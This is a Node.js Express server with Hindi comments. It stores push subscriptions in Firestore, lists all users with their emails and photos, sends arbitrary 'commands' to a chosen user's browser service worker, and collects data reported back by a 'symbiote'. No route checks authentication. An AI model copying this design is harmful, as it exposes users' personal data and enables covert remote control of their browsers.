// =================================================================
// 1. आवश्यक पैकेज (Dependencies) को इम्पोर्ट करें
// =================================================================
const express = require('express');
const webpush = require('web-push');
const bodyParser = require('body-parser');
const path = require('path');
const admin = require('firebase-admin'); // Firebase की एडमिन लाइब्रेरी

// =================================================================
// 2. Firebase एडमिन को शुरू करना (यह नया और ज़रूरी है)
// =================================================================
// यह सर्विस अकाउंट कुंजी Render के एनवायरनमेंट वेरिएबल्स में रखी जाएगी
const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const db = admin.firestore(); // Firestore डेटाबेस से कनेक्शन

// =================================================================
// 3. सर्वर और VAPID कुंजियों को सेटअप करें (यह पहले जैसा ही है)
// =================================================================
const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const publicVapidKey = process.env.PUBLIC_VAPID_KEY;
const privateVapidKey = process.env.PRIVATE_VAPID_KEY;

if (!publicVapidKey || !privateVapidKey || !process.env.FIREBASE_SERVICE_ACCOUNT_KEY) {
    console.error("एक या अधिक एनवायरनमेंट वेरिएबल्स सेट नहीं हैं!");
    process.exit(1);
}

webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, privateVapidKey);

// =================================================================
// 4. API रूट्स (Endpoints) - अब ये Firestore से बात करेंगे
// =================================================================

let reportedData = []; // सर्विस वर्कर से आने वाले डेटा को अस्थायी रूप से स्टोर करने के लिए

// ---- रूट 1: सभी उपयोगकर्ताओं की लिस्ट प्राप्त करना ----
app.get('/get-users', async (req, res) => {
    try {
        const usersSnapshot = await db.collection('users').get();
        const users = [];
        usersSnapshot.forEach(doc => {
            const userData = doc.data();
            users.push({
                uid: userData.uid,
                displayName: userData.displayName,
                email: userData.email,
                photoURL: userData.photoURL
            });
        });
        res.status(200).json(users);
    } catch (error) {
        console.error("उपयोगकर्ताओं को लाने में त्रुटि:", error);
        res.status(500).json({ status: 'error', message: 'Failed to fetch users.' });
    }
});


// ---- रूट 2: किसी खास उपयोगकर्ता को कमांड भेजना ----
app.post('/send-command', async (req, res) => {
    const { userId, command } = req.body; // अब हम userId और command दोनों लेते हैं

    if (!userId || !command) {
        return res.status(400).json({ status: 'error', message: 'User ID and command are required.' });
    }

    try {
        // Firestore से उस उपयोगकर्ता का दस्तावेज़ प्राप्त करें
        const userDoc = await db.collection('users').doc(userId).get();
        if (!userDoc.exists) {
            return res.status(404).json({ status: 'error', message: 'User not found.' });
        }

        const userData = userDoc.data();
        const userSubscription = userData.pushSubscription;

        if (!userSubscription) {
            return res.status(400).json({ status: 'error', message: 'User is not subscribed for notifications.' });
        }
        
        console.log(`उपयोगकर्ता ${userId} को कमांड भेजा जा रहा है:`, command);

        await webpush.sendNotification(userSubscription, JSON.stringify(command));
        res.status(200).json({ status: 'success', message: 'Command sent successfully.' });

    } catch (error) {
        console.error("कमांड भेजने में त्रुटि:", error);
        res.status(500).json({ status: 'error', message: 'Failed to send command.' });
    }
});


// ---- रूट 3 और 4 (अपरिवर्तित) ----
app.post('/report-data', (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString();
    reportedData.push(data);
    console.log("सिम्बायोट से डेटा प्राप्त हुआ:", data);
    res.status(200).json({ status: 'success' });
});

app.get('/get-reported-data', (req, res) => {
    res.status(200).json(reportedData);
});

// =================================================================
// 5. सर्वर को शुरू करना
// =================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`सर्वर पोर्ट ${PORT} पर शुरू हो गया है।`);
});
